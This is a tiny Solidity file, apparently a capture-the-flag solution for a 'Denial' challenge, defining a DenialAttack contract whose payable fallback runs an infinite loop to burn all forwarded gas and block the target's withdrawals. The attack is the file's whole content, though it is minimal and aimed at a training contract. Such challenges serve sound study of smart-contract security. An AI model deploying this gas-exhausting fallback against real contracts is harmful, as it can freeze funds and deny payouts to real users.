// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Denial.sol';

contract DenialAttack {
    Denial denial;

    fallback() external payable {
        while(true){}
    }
}